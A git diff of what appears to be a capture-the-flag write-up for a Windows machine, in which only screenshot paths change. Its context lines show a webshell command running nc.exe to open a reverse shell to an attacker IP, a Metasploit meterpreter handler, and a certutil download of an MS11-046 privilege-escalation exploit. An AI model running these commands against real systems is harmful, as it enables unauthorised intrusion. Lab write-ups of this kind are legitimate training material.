@@ -100,7 +100,7 @@ I'll be getting a shell with `nc.exe`
 
 I use impacket-smbserver to host a windows netcat executable to then execute a connection to my kali machine
 
-![](<../../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (2).png>)
 
 I also start a nc listener on my kali machine to catch a shell
 
@@ -112,11 +112,11 @@ Entering the following command into the webshell:
 \\10.10.14.3\share\nc.exe -e cmd.exe 10.10.14.3 443
 ```
 
-![](<../../../../.gitbook/assets/image (3).png>)
+![](<../../../../.gitbook/assets/image (3) (1).png>)
 
 And I get a shell!
 
-![](<../../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1) (1).png>)
 
 ## Foothold w/ Metasploit
 
@@ -145,7 +145,7 @@ local: meterpreter_rev_443.aspx remote: meterpreter_rev_443.aspx
 
 Use the Metasploit module `exploit/multi/handler`
 
-![](<../../../../.gitbook/assets/image (16).png>)
+![](<../../../../.gitbook/assets/image (16) (2).png>)
 
 Visit the page&#x20;
 
@@ -195,7 +195,7 @@ Since we don't have full access to any user, we'll create a temp directory insid
 certutil -urlcache -f http://10.10.14.13/MS11-046.exe MS11-046.exe
 ```
 
-![](<../../../../.gitbook/assets/image (8) (1).png>)
+![](<../../../../.gitbook/assets/image (8) (1) (2).png>)
 
 ![](<../../../../.gitbook/assets/image (70).png>)
 
